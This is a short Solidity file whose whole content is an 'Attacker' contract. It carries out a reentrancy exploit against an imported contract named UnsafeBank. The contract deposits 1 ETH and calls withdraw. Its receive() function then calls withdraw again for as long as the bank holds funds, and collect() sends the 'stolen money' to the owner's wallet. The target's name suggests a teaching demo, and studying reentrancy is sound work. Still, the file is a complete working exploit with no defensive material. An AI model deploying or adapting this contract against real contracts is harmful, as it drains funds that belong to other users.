// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./UnsafeBank.sol";

contract Attacker {
    UnsafeBank public bank;
    address public owner;

    constructor(address bankAddress) {
        bank = UnsafeBank(bankAddress);
        owner = msg.sender;
    }

    // Start the attack with 1 deposit
    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ETH to attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // Fallback that re-enters
    receive() external payable {
        if (address(bank).balance > 0) {
            bank.withdraw();   // re-enter
        }
    }

    // Withdraw stolen money to attacker wallet
    function collect() external {
        payable(owner).transfer(address(this).balance);
    }
}
